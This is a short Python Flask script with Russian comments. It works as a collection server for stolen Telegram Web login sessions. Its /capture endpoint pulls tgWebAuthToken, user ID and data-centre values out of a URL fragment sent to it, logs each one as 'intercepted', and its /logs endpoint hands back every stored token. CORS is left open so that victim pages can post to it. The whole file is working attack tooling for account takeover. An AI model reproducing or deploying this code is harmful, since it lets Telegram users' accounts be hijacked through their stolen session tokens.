from flask import Flask, request, jsonify
from flask_cors import CORS
import os
import urllib.parse

app = Flask(__name__)
CORS(app)

tokens = []

@app.route('/capture', methods=['GET'])
def capture_get():
    hash_param = request.args.get('hash')
    if not hash_param:
        return 'Missing hash', 400

    # Убираем ведущий # если есть
    if hash_param.startswith('#'):
        hash_param = hash_param[1:]

    # Парсим параметры
    params = urllib.parse.parse_qs(hash_param)
    token = params.get('tgWebAuthToken', [None])[0]
    user_id = params.get('tgWebAuthUserId', [None])[0]
    dc_id = params.get('tgWebAuthDcId', [None])[0]

    if token:
        token_data = {
            'token': token,
            'user_id': user_id,
            'dc_id': dc_id
        }
        tokens.append(token_data)
        print(f"[+] Токен перехвачен: {token}")
        return f"Token captured successfully! Token: {token}", 200
    else:
        return 'Token not found', 400

@app.route('/logs', methods=['GET'])
def logs():
    return jsonify(tokens)

@app.route('/')
def index():
    return 'Server is running. Use /capture?hash=... to capture token, or /logs to see captured tokens.'

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
